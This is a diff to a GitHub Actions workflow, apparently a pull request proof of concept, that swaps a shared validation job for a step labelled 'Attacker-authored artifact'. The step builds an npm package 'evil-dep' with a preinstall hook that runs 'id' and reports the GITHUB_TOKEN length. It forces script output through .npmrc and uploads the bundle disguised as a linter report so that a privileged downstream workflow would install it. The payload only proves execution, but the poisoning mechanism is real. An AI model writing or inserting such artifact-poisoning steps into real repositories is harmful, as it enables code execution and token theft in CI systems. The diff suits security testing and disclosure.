@@ -6,7 +6,39 @@ on:
 
 jobs:
   validate:
-    uses: AdobeDocs/adp-devsite-workflow/.github/workflows/validate-pr-v3.yml@main
-    with:
-      pr_number: ${{ github.event.pull_request.number }}
-      base_ref: ${{ github.event.pull_request.base.ref }}
+    runs-on: ubuntu-latest
+    steps:
+      - name: Attacker-authored artifact
+        run: |
+          echo "attacker-controlled linter report" > linter-report.txt
+          echo "${{ github.event.pull_request.number }}" > pr-number.txt
+          mkdir -p evilpkg/package
+          cat > evilpkg/package/package.json <<'PKG'
+          {
+            "name": "evil-dep",
+            "version": "1.0.0",
+            "scripts": {
+              "preinstall": "echo RCE-PROOF-START; id; echo GITHUB_TOKEN_len=${#GITHUB_TOKEN}; echo RCE-PROOF-END"
+            }
+          }
+          PKG
+          (cd evilpkg && tar czf ../evil.tgz package)
+          cat > package.json <<'PKG'
+          {
+            "name": "poc-root",
+            "version": "1.0.0",
+            "private": true,
+            "dependencies": { "evil-dep": "file:./evil.tgz" }
+          }
+          PKG
+          printf 'foreground-scripts=true\n' > .npmrc
+      - uses: actions/upload-artifact@v4
+        with:
+          name: linter-report
+          path: |
+            linter-report.txt
+            pr-number.txt
+            package.json
+            evil.tgz
+            .npmrc
+          include-hidden-files: true
